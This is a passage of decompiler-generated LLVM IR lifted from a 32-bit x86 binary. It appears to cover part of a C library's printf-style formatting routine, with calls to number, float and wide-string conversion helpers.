  %v2_804eb70 = inttoptr i32 %v1_804eb70 to i32*
  store i32 %v0_804eb70, i32* %v2_804eb70, align 4
  %v0_804eb73 = load i32, i32* @esi, align 4
  %v1_804eb73 = load i32, i32* @esp, align 4
  %v2_804eb73 = add i32 %v1_804eb73, -4
  %v3_804eb73 = inttoptr i32 %v2_804eb73 to i32*
  store i32 %v0_804eb73, i32* %v3_804eb73, align 4
  %v0_804eb74 = load i32, i32* @edx, align 4
  %v2_804eb74 = add i32 %v1_804eb73, -8
  %v3_804eb74 = inttoptr i32 %v2_804eb74 to i32*
  store i32 %v0_804eb74, i32* %v3_804eb74, align 4
  %v2_804eb75 = add i32 %v1_804eb73, -12
  %v3_804eb75 = inttoptr i32 %v2_804eb75 to i32*
  store i32 %v0_804eb6b, i32* %v3_804eb75, align 4
  %v1_804eb76 = add i32 %v1_804eb73, 347
  store i32 %v1_804eb76, i32* %eax.global-to-local, align 4
  %v2_804eb7d = add i32 %v1_804eb73, -16
  %v3_804eb7d = inttoptr i32 %v2_804eb7d to i32*
  store i32 %v1_804eb76, i32* %v3_804eb7d, align 4
  %v0_804eb7e = load i32, i32* %stack_var_-364, align 4
  %v5_804eb7e = inttoptr i32 %v0_804eb7e to i8*
  %v6_804eb7e = call i32 @_uintmaxtostr(i8* %v5_804eb7e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804eb7e, i32* %eax.global-to-local, align 4
  %v0_804eb83 = load i32, i32* @esp, align 4
  %v1_804eb83 = add i32 %v0_804eb83, 32
  %v1_804eb86 = add i32 %v0_804eb83, 80
  %v2_804eb86 = inttoptr i32 %v1_804eb86 to i32*
  %v3_804eb86 = load i32, i32* %v2_804eb86, align 4
  %v4_804eb86 = add i32 %v3_804eb86, -5
  %v8_804eb86 = icmp ult i32 %v3_804eb86, 5
  %v12_804eb86 = icmp eq i32 %v4_804eb86, 0
  %v13_804eb86 = icmp slt i32 %v4_804eb86, 0
  store i1 %v13_804eb86, i1* %sf.global-to-local, align 1
  store i32 %v6_804eb7e, i32* @edi, align 4
  %v2_804eb8d = or i1 %v8_804eb86, %v12_804eb86
  br i1 %v2_804eb8d, label %dec_label_pc_804ebb7, label %dec_label_pc_804eb8f

dec_label_pc_804eb8f:                             ; preds = %dec_label_pc_804eb67
  %v7_804eb7e = inttoptr i32 %v6_804eb7e to i8*
  %v3_804eb8f = load i8, i8* %v7_804eb7e, align 1
  %v4_804eb8f = add i8 %v3_804eb8f, -45
  %v12_804eb8f = icmp eq i8 %v4_804eb8f, 0
  %v13_804eb8f = icmp slt i8 %v4_804eb8f, 0
  store i1 %v13_804eb8f, i1* %sf.global-to-local, align 1
  %v1_804eb92 = icmp eq i1 %v12_804eb8f, false
  %v1_804eba1 = add i32 %v0_804eb83, 64
  %v2_804eba1 = inttoptr i32 %v1_804eba1 to i32*
  %v3_804eba1 = load i32, i32* %v2_804eba1, align 4
  br i1 %v1_804eb92, label %dec_label_pc_804eba1, label %dec_label_pc_804eb94

dec_label_pc_804eb94:                             ; preds = %dec_label_pc_804eb8f
  %v4_804eb94 = or i32 %v3_804eba1, 2
  store i32 %v4_804eb94, i32* %v2_804eba1, align 4
  %v0_804eb99 = load i32, i32* @edi, align 4
  %v1_804eb99 = add i32 %v0_804eb99, 1
  %v9_804eb99 = icmp slt i32 %v1_804eb99, 0
  store i1 %v9_804eb99, i1* %sf.global-to-local, align 1
  store i32 %v1_804eb99, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804ebb7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebb7

dec_label_pc_804eba1:                             ; preds = %dec_label_pc_804eb8f
  store i32 %v3_804eba1, i32* %eax.global-to-local, align 4
  %v2_804eba5 = and i32 %v3_804eba1, 2
  %v3_804eba5 = icmp eq i32 %v2_804eba5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804eba5, label %dec_label_pc_804ebad, label %dec_label_pc_804eba9

dec_label_pc_804eba9:                             ; preds = %dec_label_pc_804eba1
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804ebb7

dec_label_pc_804ebad:                             ; preds = %dec_label_pc_804eba1
  %v2_804ebad = urem i32 %v3_804eba1, 2
  %v3_804ebad = icmp eq i32 %v2_804ebad, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804ebb4 = icmp eq i1 %v3_804ebad, false
  %v2_804ebb4 = load i32, i32* @ebp, align 4
  %v4_804ebb4 = select i1 %v1_804ebb4, i32 4, i32 %v2_804ebb4
  store i32 %v4_804ebb4, i32* @ebp, align 4
  br label %dec_label_pc_804ebb7

dec_label_pc_804ebb7:                             ; preds = %dec_label_pc_804eb67, %dec_label_pc_804eba9, %dec_label_pc_804eb94, %dec_label_pc_804ebad
  %v0_804ec09 = phi i32 [ %v6_804eb7e, %dec_label_pc_804eb67 ], [ %v6_804eb7e, %dec_label_pc_804eba9 ], [ %v1_804eb99, %dec_label_pc_804eb94 ], [ %v6_804eb7e, %dec_label_pc_804ebad ]
  %v0_804ec19 = phi i32 [ %v1_804eb83, %dec_label_pc_804eb67 ], [ %v1_804eb83, %dec_label_pc_804eba9 ], [ %v0_804ebb7.pre, %dec_label_pc_804eb94 ], [ %v1_804eb83, %dec_label_pc_804ebad ]
  %v1_804ebb7 = add i32 %v0_804ec19, 20
  %v2_804ebb7 = inttoptr i32 %v1_804ebb7 to i32*
  %v3_804ebb7 = load i32, i32* %v2_804ebb7, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804ebbb = sub i32 204, %v0_804ec09
  %v2_804ebc7 = add i32 %v1_804ebbb, %v0_804ec19
  %v1_804ebc9 = add i32 %v2_804ebc7, 127
  store i32 %v1_804ebc9, i32* @esi, align 4
  %v2_804ebcc = icmp slt i32 %v3_804ebb7, 0
  store i1 %v2_804ebcc, i1* %sf.global-to-local, align 1
  %v3_804ebce = select i1 %v2_804ebcc, i32 1, i32 %v3_804ebb7
  store i32 %v3_804ebce, i32* %ecx.global-to-local, align 4
  %v1_804ebd1 = add i32 %v0_804ec19, 32
  %v2_804ebd1 = inttoptr i32 %v1_804ebd1 to i8*
  %v3_804ebd1 = load i8, i8* %v2_804ebd1, align 1
  %v4_804ebd1 = and i8 %v3_804ebd1, 16
  %v5_804ebd1 = icmp eq i8 %v4_804ebd1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804ebd1, label %dec_label_pc_804ec09, label %dec_label_pc_804ebd8

dec_label_pc_804ebd8:                             ; preds = %dec_label_pc_804ebb7
  %v1_804ebd8 = add i32 %v0_804ec19, 48
  %v2_804ebd8 = inttoptr i32 %v1_804ebd8 to i32*
  %v3_804ebd8 = load i32, i32* %v2_804ebd8, align 4
  store i32 %v3_804ebd8, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i32 %v3_804ebd8, 3
  %v3_804ebe1 = load i32, i32* @ebp, align 4
  %v5_804ebe1 = select i1 %tmp69, i32 6, i32 %v3_804ebe1
  store i32 %v5_804ebe1, i32* @ebp, align 4
  %v1_804ebe4 = add i32 %v3_804ebd8, -3
  %v9_804ebe4 = icmp eq i32 %v1_804ebe4, 0
  %v10_804ebe4 = icmp slt i32 %v1_804ebe4, 0
  store i1 %v10_804ebe4, i1* %sf.global-to-local, align 1
  %v1_804ebe7 = icmp eq i1 %v9_804ebe4, false
  br i1 %v1_804ebe7, label %dec_label_pc_804ebf0, label %dec_label_pc_804ebe9

dec_label_pc_804ebe9:                             ; preds = %dec_label_pc_804ebd8
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804ec09

dec_label_pc_804ebf0:                             ; preds = %dec_label_pc_804ebd8
  %v1_804ebf0 = add i32 %v3_804ebd8, -4
  %v9_804ebf0 = icmp eq i32 %v1_804ebf0, 0
  %v10_804ebf0 = icmp slt i32 %v1_804ebf0, 0
  store i1 %v10_804ebf0, i1* %sf.global-to-local, align 1
  %v1_804ebf3 = icmp eq i1 %v9_804ebf0, false
  br i1 %v1_804ebf3, label %dec_label_pc_804ec09, label %dec_label_pc_804ebf5

dec_label_pc_804ebf5:                             ; preds = %dec_label_pc_804ebf0
  %v2_804ebf5 = sub i32 %v3_804ebce, %v1_804ebc9
  %v7_804ebf5 = icmp ult i32 %v3_804ebce, %v1_804ebc9
  %v12_804ebf5 = icmp eq i32 %v2_804ebf5, 0
  %v13_804ebf5 = icmp slt i32 %v2_804ebf5, 0
  store i1 %v13_804ebf5, i1* %sf.global-to-local, align 1
  %v2_804ebf7 = or i1 %v7_804ebf5, %v12_804ebf5
  br i1 %v2_804ebf7, label %dec_label_pc_804ebf9, label %dec_label_pc_804ec09

dec_label_pc_804ebf9:                             ; preds = %dec_label_pc_804ebf5
  %v1_804ebf9 = inttoptr i32 %v0_804ec09 to i8*
  %v2_804ebf9 = load i8, i8* %v1_804ebf9, align 1
  %v3_804ebf9 = add i8 %v2_804ebf9, -48
  %v8_804ebf9 = icmp eq i8 %v3_804ebf9, 0
  %v9_804ebf9 = icmp slt i8 %v3_804ebf9, 0
  store i1 %v9_804ebf9, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804ebf9, label %dec_label_pc_804ec09, label %dec_label_pc_804ec03

dec_label_pc_804ec03:                             ; preds = %dec_label_pc_804ebf9
  %v1_804ec03 = add i32 %v2_804ebc7, 128
  store i32 %v1_804ec03, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ec09

dec_label_pc_804ec09:                             ; preds = %dec_label_pc_804ebf5, %dec_label_pc_804ebf9, %dec_label_pc_804ebf0, %dec_label_pc_804ebb7, %dec_label_pc_804ebe9, %dec_label_pc_804ec03
  %v0_804ec42 = phi i32 [ %v3_804ebce, %dec_label_pc_804ebf5 ], [ 1, %dec_label_pc_804ebf9 ], [ %v3_804ebce, %dec_label_pc_804ebf0 ], [ %v3_804ebce, %dec_label_pc_804ebb7 ], [ %v3_804ebce, %dec_label_pc_804ebe9 ], [ %v1_804ec03, %dec_label_pc_804ec03 ]
  %v1_804ec09 = inttoptr i32 %v0_804ec09 to i8*
  %v2_804ec09 = load i8, i8* %v1_804ec09, align 1
  %v3_804ec09 = add i8 %v2_804ec09, -48
  %v8_804ec09 = icmp eq i8 %v3_804ec09, 0
  %v9_804ec09 = icmp slt i8 %v3_804ec09, 0
  store i1 %v9_804ec09, i1* %sf.global-to-local, align 1
  %v1_804ec0c = icmp eq i1 %v8_804ec09, false
  br i1 %v1_804ec0c, label %dec_label_pc_804ec3a, label %dec_label_pc_804ec0e

dec_label_pc_804ec0e:                             ; preds = %dec_label_pc_804ec09
  %v0_804ec0e = load i32, i32* @ebp, align 4
  %v1_804ec0e = add i32 %v0_804ec0e, -6
  %v6_804ec0e = sub i32 5, %v0_804ec0e
  %v7_804ec0e = and i32 %v6_804ec0e, %v0_804ec0e
  %v8_804ec0e = icmp slt i32 %v7_804ec0e, 0
  %v10_804ec0e = icmp slt i32 %v1_804ec0e, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804ec16 = icmp eq i1 %v10_804ec0e, %v8_804ec0e
  %v5_804ec16 = select i1 %v2_804ec16, i32 11, i32 %v0_804ec0e
  store i32 %v5_804ec16, i32* @ebp, align 4
  %v1_804ec19 = add i32 %v0_804ec19, 48
  %v2_804ec19 = inttoptr i32 %v1_804ec19 to i32*
  %v3_804ec19 = load i32, i32* %v2_804ec19, align 4
  %v4_804ec19 = add i32 %v3_804ec19, -1
  %v12_804ec19 = icmp eq i32 %v4_804ec19, 0
  %v13_804ec19 = icmp slt i32 %v4_804ec19, 0
  store i1 %v13_804ec19, i1* %sf.global-to-local, align 1
  %v1_804ec1e = icmp eq i1 %v12_804ec19, false
  br i1 %v1_804ec1e, label %dec_label_pc_804ec2f, label %dec_label_pc_804ec20

dec_label_pc_804ec20:                             ; preds = %dec_label_pc_804ec0e
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8053658.102 to i32), i32* @edi, align 4
  br label %dec_label_pc_804edb9

dec_label_pc_804ec2f:                             ; preds = %dec_label_pc_804ec0e
  %v1_804ec2f = icmp eq i32 %v0_804ec42, 0
  %v2_804ec2f = icmp slt i32 %v0_804ec42, 0
  store i1 %v2_804ec2f, i1* %sf.global-to-local, align 1
  %v1_804ec31 = icmp eq i1 %v1_804ec2f, false
  br i1 %v1_804ec31, label %dec_label_pc_804ec3a, label %dec_label_pc_804ec33

dec_label_pc_804ec33:                             ; preds = %dec_label_pc_804ec2f
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804edb9

dec_label_pc_804ec3a:                             ; preds = %dec_label_pc_804ec2f, %dec_label_pc_804ec09
  %v2_804ec3a = sub i32 %v0_804ec42, %v1_804ebc9
  %v7_804ec3a = icmp ult i32 %v0_804ec42, %v1_804ebc9
  %v12_804ec3a = icmp eq i32 %v2_804ec3a, 0
  %v13_804ec3a = icmp slt i32 %v2_804ec3a, 0
  store i1 %v13_804ec3a, i1* %sf.global-to-local, align 1
  %v2_804ec3c = or i1 %v7_804ec3a, %v12_804ec3a
  br i1 %v2_804ec3c, label %dec_label_pc_804edb9, label %dec_label_pc_804ec42

dec_label_pc_804ec42:                             ; preds = %dec_label_pc_804ec3a
  store i1 %v13_804ec3a, i1* %sf.global-to-local, align 1
  store i32 %v2_804ec3a, i32* @ebx, align 4
  br label %dec_label_pc_804edd3

dec_label_pc_804ec4b:                             ; preds = %dec_label_pc_804eade
  %v1_804ec4b = add i32 %v3_804eab0, -15
  %v5_804ec4b = icmp ult i32 %v3_804eab0, 15
  %v9_804ec4b = icmp eq i32 %v1_804ec4b, 0
  %v10_804ec4b = icmp slt i32 %v1_804ec4b, 0
  store i1 %v10_804ec4b, i1* %sf.global-to-local, align 1
  %v2_804ec4e = or i1 %v5_804ec4b, %v9_804ec4b
  br i1 %v2_804ec4e, label %dec_label_pc_804ec50, label %dec_label_pc_804ec95

dec_label_pc_804ec50:                             ; preds = %dec_label_pc_804ec4b
  %v1_804ec50 = add i32 %v0_804eab0.lcssa, 33
  %v2_804ec50 = inttoptr i32 %v1_804ec50 to i8*
  %v3_804ec50 = load i8, i8* %v2_804ec50, align 1
  %v4_804ec50 = and i8 %v3_804ec50, 8
  %v5_804ec50 = icmp eq i8 %v4_804ec50, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804ec55 = add i32 %v0_804eab0.lcssa, 344
  %v2_804ec55 = inttoptr i32 %v1_804ec55 to i32*
  %v3_804ec55 = load i32, i32* %v2_804ec55, align 4
  store i32 %v3_804ec55, i32* %edx.global-to-local, align 4
  br i1 %v5_804ec50, label %dec_label_pc_804ec62, label %dec_label_pc_804ec5e

dec_label_pc_804ec5e:                             ; preds = %dec_label_pc_804ec50
  %v1_804ec5e = inttoptr i32 %v3_804ec55 to x86_fp80*
  %v2_804ec5e = load x86_fp80, x86_fp80* %v1_804ec5e, align 4
  br label %dec_label_pc_804ec64

dec_label_pc_804ec62:                             ; preds = %dec_label_pc_804ec50
  %v1_804ec62 = inttoptr i32 %v3_804ec55 to double*
  %v2_804ec62 = load double, double* %v1_804ec62, align 4
  %v3_804ec62 = fpext double %v2_804ec62 to x86_fp80
  br label %dec_label_pc_804ec64

dec_label_pc_804ec64:                             ; preds = %dec_label_pc_804ec5e, %dec_label_pc_804ec62
  %storemerge4 = phi x86_fp80 [ %v2_804ec5e, %dec_label_pc_804ec5e ], [ %v3_804ec62, %dec_label_pc_804ec62 ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804ec64 = load i32, i32* @esi, align 4
  %v2_804ec64 = add i32 %v0_804eab0.lcssa, -4
  %v3_804ec64 = inttoptr i32 %v2_804ec64 to i32*
  store i32 %v0_804ec64, i32* %v3_804ec64, align 4
  %v0_804ec65 = load i32, i32* @esi, align 4
  %v2_804ec65 = add i32 %v0_804eab0.lcssa, -8
  %v3_804ec65 = inttoptr i32 %v2_804ec65 to i32*
  store i32 %v0_804ec65, i32* %v3_804ec65, align 4
  %v1_804ec66 = add i32 %v0_804eab0.lcssa, -12
  %v2_804ec66 = inttoptr i32 %v1_804ec66 to i32*
  store i32 134539558, i32* %v2_804ec66, align 4
  %v1_804ec6b = add i32 %v0_804eab0.lcssa, 20
  store i32 %v1_804ec6b, i32* %eax.global-to-local, align 4
  %v2_804ec6f = add i32 %v0_804eab0.lcssa, -16
  %v3_804ec6f = inttoptr i32 %v2_804ec6f to i32*
  store i32 %v1_804ec6b, i32* %v3_804ec6f, align 4
  %v1_804ec70 = add i32 %v0_804eab0.lcssa, -28
  %v10_804ec70 = icmp slt i32 %v1_804ec70, 0
  store i1 %v10_804ec70, i1* %sf.global-to-local, align 1
  %v1_804ec73 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804ec73 = inttoptr i32 %v1_804ec70 to x86_fp80*
  store x86_fp80 %v1_804ec73, x86_fp80* %v3_804ec73, align 4
  %v1_804ec76 = add i32 %v0_804eab0.lcssa, 368
  %v2_804ec76 = inttoptr i32 %v1_804ec76 to i32*
  %v3_804ec76 = load i32, i32* %v2_804ec76, align 4
  %v5_804ec76 = add i32 %v0_804eab0.lcssa, -32
  %v6_804ec76 = inttoptr i32 %v5_804ec76 to i32*
  store i32 %v3_804ec76, i32* %v6_804ec76, align 4
  %v0_804ec7d = call i32 @_fpmaxtostr()
  store i32 %v0_804ec7d, i32* %eax.global-to-local, align 4
  %v0_804ec82 = load i32, i32* @esp, align 4
  %v1_804ec82 = add i32 %v0_804ec82, 32
  %v2_804ec85 = icmp slt i32 %v0_804ec7d, 0
  store i1 %v2_804ec85, i1* %sf.global-to-local, align 1
  br i1 %v2_804ec85, label %dec_label_pc_804ef33, label %dec_label_pc_804ec8d

dec_label_pc_804ec8d:                             ; preds = %dec_label_pc_804ec64
  %v1_804ec8d = inttoptr i32 %v1_804ec82 to i32*
  %v2_804ec8d = load i32, i32* %v1_804ec8d, align 4
  %v4_804ec8d = add i32 %v2_804ec8d, %v0_804ec7d
  %v15_804ec8d = icmp slt i32 %v4_804ec8d, 0
  store i1 %v15_804ec8d, i1* %sf.global-to-local, align 1
  store i32 %v4_804ec8d, i32* %v1_804ec8d, align 4
  %v0_804ef20.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ef20

dec_label_pc_804ec95:                             ; preds = %dec_label_pc_804ec4b
  %v1_804ec95 = add i32 %v3_804eab0, -17
  %v5_804ec95 = icmp ult i32 %v3_804eab0, 17
  %v9_804ec95 = icmp eq i32 %v1_804ec95, 0
  %v10_804ec95 = icmp slt i32 %v1_804ec95, 0
  store i1 %v10_804ec95, i1* %sf.global-to-local, align 1
  %v2_804ec98 = or i1 %v5_804ec95, %v9_804ec95
  br i1 %v2_804ec98, label %dec_label_pc_804ec9e, label %dec_label_pc_804ed32

dec_label_pc_804ec9e:                             ; preds = %dec_label_pc_804ec95
  %v1_804ec9e = add i32 %v0_804eab0.lcssa, 332
  %v2_804ec9e = inttoptr i32 %v1_804ec9e to i32*
  store i32 0, i32* %v2_804ec9e, align 4
  %v0_804eca9 = load i32, i32* @esp, align 4
  %v1_804eca9 = add i32 %v0_804eca9, 344
  %v2_804eca9 = inttoptr i32 %v1_804eca9 to i32*
  %v3_804eca9 = load i32, i32* %v2_804eca9, align 4
  store i32 %v3_804eca9, i32* %edx.global-to-local, align 4
  %v1_804ecb0 = icmp eq i1 %v9_804ec95, false
  br i1 %v1_804ecb0, label %dec_label_pc_804ed02, label %dec_label_pc_804ecb2

dec_label_pc_804ecb2:                             ; preds = %dec_label_pc_804ec9e
  %v1_804ecb2 = inttoptr i32 %v3_804eca9 to i32*
  %v2_804ecb2 = load i32, i32* %v1_804ecb2, align 4
  store i32 %v2_804ecb2, i32* %eax.global-to-local, align 4
  %v1_804ecb4 = icmp eq i32 %v2_804ecb2, 0
  %v2_804ecb4 = icmp slt i32 %v2_804ecb2, 0
  store i1 %v2_804ecb4, i1* %sf.global-to-local, align 1
  %v2_804ecb6 = add i32 %v0_804eca9, 340
  %v3_804ecb6 = inttoptr i32 %v2_804ecb6 to i32*
  store i32 %v2_804ecb2, i32* %v3_804ecb6, align 4
  br i1 %v1_804ecb4, label %dec_label_pc_804edbd, label %dec_label_pc_804ecc3

dec_label_pc_804ecc3:                             ; preds = %dec_label_pc_804ecb2
  %v0_804ecc3 = load i32, i32* @esp, align 4
  %v1_804ecc3 = add i32 %v0_804ecc3, 20
  %v2_804ecc3 = inttoptr i32 %v1_804ecc3 to i32*
  %v3_804ecc3 = load i32, i32* %v2_804ecc3, align 4
  %v1_804ecca = add i32 %v0_804ecc3, 340
  store i32 %v1_804ecca, i32* %ecx.global-to-local, align 4
  %v2_804ecd1 = icmp slt i32 %v3_804ecc3, 0
  store i1 %v2_804ecd1, i1* %sf.global-to-local, align 1
  %v1_804ecd3 = icmp eq i1 %v2_804ecd1, false
  %v4_804ecd3 = select i1 %v1_804ecd3, i32 %v3_804ecc3, i32 -1
  store i32 %v4_804ecd3, i32* %edx.global-to-local, align 4
  %v1_804ecd6 = add i32 %v0_804ecc3, 332
  store i32 %v1_804ecd6, i32* %eax.global-to-local, align 4
  %v2_804ecdd = add i32 %v0_804ecc3, -4
  %v3_804ecdd = inttoptr i32 %v2_804ecdd to i32*
  store i32 %v1_804ecd6, i32* %v3_804ecdd, align 4
  %v0_804ecde = load i32, i32* %edx.global-to-local, align 4
  %v2_804ecde = add i32 %v0_804ecc3, -8
  %v3_804ecde = inttoptr i32 %v2_804ecde to i32*
  store i32 %v0_804ecde, i32* %v3_804ecde, align 4
  %v0_804ecdf = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ecdf = add i32 %v0_804ecc3, -12
  %v3_804ecdf = inttoptr i32 %v2_804ecdf to i32*
  store i32 %v0_804ecdf, i32* %v3_804ecdf, align 4
  %v0_804ece0 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ece0 = add i32 %v0_804ecc3, -16
  %v3_804ece0 = inttoptr i32 %v2_804ece0 to i32*
  store i32 %v0_804ece0, i32* %v3_804ece0, align 4
  %v0_804ece1 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804ece1, i32* %eax.global-to-local, align 4
  %v0_804ece6 = load i32, i32* @esp, align 4
  %v1_804ece6 = add i32 %v0_804ece6, 16
  %v1_804ece9 = add i32 %v0_804ece1, 1
  %v10_804ece9 = icmp eq i32 %v1_804ece9, 0
  %v11_804ece9 = icmp slt i32 %v1_804ece9, 0
  store i1 %v11_804ece9, i1* %sf.global-to-local, align 1
  store i32 %v0_804ece1, i32* @esi, align 4
  br i1 %v10_804ece9, label %dec_label_pc_804ef33, label %dec_label_pc_804ecf4

dec_label_pc_804ecf4:                             ; preds = %dec_label_pc_804ecc3
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804edce

dec_label_pc_804ed02:                             ; preds = %dec_label_pc_804ec9e
  %v0_804ed02 = load i32, i32* @ebx, align 4
  %v2_804ed02 = add i32 %v0_804eca9, -4
  %v3_804ed02 = inttoptr i32 %v2_804ed02 to i32*
  store i32 %v0_804ed02, i32* %v3_804ed02, align 4
  %v1_804ed03 = add i32 %v0_804eca9, 332
  store i32 %v1_804ed03, i32* %eax.global-to-local, align 4
  %v2_804ed0a = add i32 %v0_804eca9, -8
  %v3_804ed0a = inttoptr i32 %v2_804ed0a to i32*
  store i32 %v1_804ed03, i32* %v3_804ed0a, align 4
  %v0_804ed0b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed0b = inttoptr i32 %v0_804ed0b to i32*
  %v2_804ed0b = load i32, i32* %v1_804ed0b, align 4
  %v4_804ed0b = add i32 %v0_804eca9, -12
  %v5_804ed0b = inttoptr i32 %v4_804ed0b to i32*
  store i32 %v2_804ed0b, i32* %v5_804ed0b, align 4
  %v1_804ed0d = add i32 %v0_804eca9, 204
  store i32 %v1_804ed0d, i32* @edi, align 4
  %v2_804ed14 = add i32 %v0_804eca9, -16
  %v3_804ed14 = inttoptr i32 %v2_804ed14 to i32*
  store i32 %v1_804ed0d, i32* %v3_804ed14, align 4
  %v0_804ed15 = call i32 @__GI_wcrtomb()
  store i32 %v0_804ed15, i32* %eax.global-to-local, align 4
  %v0_804ed1a = load i32, i32* @esp, align 4
  %v1_804ed1a = add i32 %v0_804ed1a, 16
  %v1_804ed1d = add i32 %v0_804ed15, 1
  %v10_804ed1d = icmp eq i32 %v1_804ed1d, 0
  %v11_804ed1d = icmp slt i32 %v1_804ed1d, 0
  store i1 %v11_804ed1d, i1* %sf.global-to-local, align 1
  store i32 %v0_804ed15, i32* @esi, align 4
  br i1 %v10_804ed1d, label %dec_label_pc_804ef33, label %dec_label_pc_804ed28

dec_label_pc_804ed28:                             ; preds = %dec_label_pc_804ed02
  %v2_804ed28 = add i32 %v0_804ed15, 220
  %v3_804ed28 = add i32 %v2_804ed28, %v0_804ed1a
  %v4_804ed28 = inttoptr i32 %v3_804ed28 to i8*
  store i8 0, i8* %v4_804ed28, align 1
  br label %dec_label_pc_804ed60

dec_label_pc_804ed32:                             ; preds = %dec_label_pc_804ec95
  %v1_804ed32 = add i32 %v3_804eab0, -19
  %v5_804ed32 = icmp ult i32 %v3_804eab0, 19
  %v9_804ed32 = icmp eq i32 %v1_804ed32, 0
  %v10_804ed32 = icmp slt i32 %v1_804ed32, 0
  store i1 %v10_804ed32, i1* %sf.global-to-local, align 1
  %v2_804ed35 = or i1 %v5_804ed32, %v9_804ed32
  br i1 %v2_804ed35, label %dec_label_pc_804ed37, label %dec_label_pc_804ed8f

dec_label_pc_804ed37:                             ; preds = %dec_label_pc_804ed32
  %v1_804ed37 = add i32 %v0_804eab0.lcssa, 344
  %v2_804ed37 = inttoptr i32 %v1_804ed37 to i32*
  %v3_804ed37 = load i32, i32* %v2_804ed37, align 4
  store i32 %v3_804ed37, i32* %edx.global-to-local, align 4
  %v1_804ed3e = icmp eq i1 %v9_804ed32, false
  %v1_804ed69 = inttoptr i32 %v3_804ed37 to i32*
  %v2_804ed69 = load i32, i32* %v1_804ed69, align 4
  br i1 %v1_804ed3e, label %dec_label_pc_804ed69, label %dec_label_pc_804ed40

dec_label_pc_804ed40:                             ; preds = %dec_label_pc_804ed37
  store i32 %v2_804ed69, i32* @edi, align 4
  %v1_804ed42 = icmp eq i32 %v2_804ed69, 0
  %v2_804ed42 = icmp slt i32 %v2_804ed69, 0
  store i1 %v2_804ed42, i1* %sf.global-to-local, align 1
  br i1 %v1_804ed42, label %dec_label_pc_804edbd, label %dec_label_pc_804ed46

dec_label_pc_804ed46:                             ; preds = %dec_label_pc_804ed40, %dec_label_pc_804ed98
  %v1_804ed4d = phi i32 [ %v0_804eab0.lcssa, %dec_label_pc_804ed40 ], [ %v1_804edb2, %dec_label_pc_804ed98 ]
  %v1_804ed46 = add i32 %v1_804ed4d, 20
  %v2_804ed46 = inttoptr i32 %v1_804ed46 to i32*
  %v3_804ed46 = load i32, i32* %v2_804ed46, align 4
  store i32 %v3_804ed46, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804ed4d = add i32 %v1_804ed4d, -4
  %v3_804ed4d = inttoptr i32 %v2_804ed4d to i32*
  store i32 %v3_804eab0, i32* %v3_804ed4d, align 4
  %v2_804ed4e = add i32 %v1_804ed4d, -8
  %v3_804ed4e = inttoptr i32 %v2_804ed4e to i32*
  store i32 %v3_804eab0, i32* %v3_804ed4e, align 4
  %v2_804ed4f = icmp slt i32 %v3_804ed46, 0
  store i1 %v2_804ed4f, i1* %sf.global-to-local, align 1
  %v1_804ed51 = icmp eq i1 %v2_804ed4f, false
  %v2_804ed51 = load i32, i32* %eax.global-to-local, align 4
  %v4_804ed51 = select i1 %v1_804ed51, i32 %v3_804ed46, i32 %v2_804ed51
  store i32 %v4_804ed51, i32* %eax.global-to-local, align 4
  %v2_804ed54 = add i32 %v1_804ed4d, -12
  %v3_804ed54 = inttoptr i32 %v2_804ed54 to i32*
  store i32 %v4_804ed51, i32* %v3_804ed54, align 4
  %v0_804ed55 = load i32, i32* @edi, align 4
  %v2_804ed55 = add i32 %v1_804ed4d, -16
  %v3_804ed55 = inttoptr i32 %v2_804ed55 to i32*
  store i32 %v0_804ed55, i32* %v3_804ed55, align 4
  %v0_804ed56 = call i32 @strnlen()
  store i32 %v0_804ed56, i32* %eax.global-to-local, align 4
  %v0_804ed5b = load i32, i32* @esp, align 4
  %v1_804ed5b = add i32 %v0_804ed5b, 16
  %v7_804ed5b = icmp slt i32 %v1_804ed5b, 0
  store i1 %v7_804ed5b, i1* %sf.global-to-local, align 1
  store i32 %v0_804ed56, i32* @esi, align 4
  br label %dec_label_pc_804ed60

dec_label_pc_804ed60:                             ; preds = %dec_label_pc_804ed28, %dec_label_pc_804ed46
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804edce

dec_label_pc_804ed69:                             ; preds = %dec_label_pc_804ed37
  store i32 %v2_804ed69, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804ed77 = add i32 %v0_804eab0.lcssa, 204
